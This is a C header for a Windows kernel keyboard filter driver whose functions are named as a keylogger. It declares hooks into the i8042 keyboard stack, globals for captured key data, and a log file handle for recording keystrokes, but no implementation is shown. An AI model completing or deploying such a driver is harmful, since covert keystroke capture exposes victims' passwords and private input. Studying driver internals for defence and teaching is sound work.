
#ifndef KBFILTER_H
#define KBFILTER_H

#include "wdm.h"
#include "ntddk.h"
#include "kbdmou.h"
#include <ntddkbd.h>
#include <ntdd8042.h>
#include <ntdd8042.h>
#include <wchar.h>
#include <ntstrsafe.h>
#define KBFILTER_POOL_TAG (ULONG) 'tlfK'
#undef ExAllocatePool
#define ExAllocatePool(type, size) \
            ExAllocatePoolWithTag (type, size, KBFILTER_POOL_TAG)

#if DBG

#define TRAP()                      DbgBreakPoint()
#define DbgRaiseIrql(_x_,_y_)       KeRaiseIrql(_x_,_y_)
#define DbgLowerIrql(_x_)           KeLowerIrql(_x_)

#define DebugPrint(_x_) DbgPrint _x_

#else   // DBG

#define TRAP()
#define DbgRaiseIrql(_x_,_y_)
#define DbgLowerIrql(_x_)

#define DebugPrint(_x_) 

#endif

#define MIN(_A_,_B_) (((_A_) < (_B_)) ? (_A_) : (_B_))

volatile BOOLEAN g_bUnload = FALSE;
volatile LONG gSysEnters = 0;
PDEVICE_OBJECT g_pDeviceObject = NULL;
PDEVICE_OBJECT g_pControlDeviceObject = NULL;

USHORT						 scanCode = 0;
PKEYBOARD_INPUT_DATA		 KeyData;
HANDLE						 hLogFile;
OBJECT_ATTRIBUTES			 ObjAttr;
IO_STATUS_BLOCK				 IoStatus;
UNICODE_STRING				 logNameFile;
typedef struct _DEVICE_EXTENSION
{
 
    PDEVICE_OBJECT  Self;

    PDEVICE_OBJECT  PDO;

    PDEVICE_OBJECT  TopOfStack;

    LONG EnableCount;

    CONNECT_DATA UpperConnectData;
                            
    PVOID UpperContext;
    PI8042_KEYBOARD_INITIALIZATION_ROUTINE UpperInitializationRoutine;
    PI8042_KEYBOARD_ISR UpperIsrHook;

    IN PI8042_ISR_WRITE_PORT IsrWritePort;

    IN PI8042_QUEUE_PACKET QueueKeyboardPacket;

    IN PVOID CallContext;

    DEVICE_POWER_STATE  DeviceState;

    BOOLEAN         Started;
    BOOLEAN         SurpriseRemoved;
    BOOLEAN         Removed;

} DEVICE_EXTENSION, *PDEVICE_EXTENSION;

NTSTATUS
AddDevice(
    IN PDRIVER_OBJECT DriverObject,
    IN PDEVICE_OBJECT BusDeviceObject
    );

NTSTATUS ReadCompletion(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP			  Irp,
	IN PVOID		  Context
);

NTSTATUS
KBKeyloggerRead(
	IN PDEVICE_OBJECT   DeviceObject,
	IN PIRP             Irp
);

NTSTATUS
KBKeyloggerCreateClose (
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP Irp
    );

NTSTATUS
KBKeyloggerDispatchPassThrough(
        IN PDEVICE_OBJECT DeviceObject,
        IN PIRP			  Irp
        );
   
NTSTATUS
KBKeyloggerInternIoCtl (
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP			 Irp
    );

NTSTATUS
KBKeyloggerPnP (
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP			  Irp
    );

NTSTATUS
KBKeyloggerPower (
    IN PDEVICE_OBJECT DeviceObject,
    IN PIRP			  Irp
    );

NTSTATUS
InitializationRoutine(
    IN PDEVICE_OBJECT                 DeviceObject,    // InitializationContext
    IN PVOID                           SynchFuncContext,
    IN PI8042_SYNCH_READ_PORT          ReadPort,
    IN PI8042_SYNCH_WRITE_PORT         WritePort,
    OUT PBOOLEAN                       TurnTranslationOn
    );

BOOLEAN
IsrHook(
    PDEVICE_OBJECT         DeviceObject,               // IsrContext
    PKEYBOARD_INPUT_DATA   CurrentInput, 
    POUTPUT_PACKET         CurrentOutput,
    UCHAR                  StatusByte,
    PUCHAR                 DataByte,
    PBOOLEAN               ContinueProcessing,
    PKEYBOARD_SCAN_STATE   ScanState
    );

VOID
ServiceCallback(
    IN PDEVICE_OBJECT DeviceObject,
    IN PKEYBOARD_INPUT_DATA InputDataStart,
    IN PKEYBOARD_INPUT_DATA InputDataEnd,
    IN OUT PULONG InputDataConsumed
    );

VOID
Unload (
    IN PDRIVER_OBJECT DriverObject
    );

#endif  



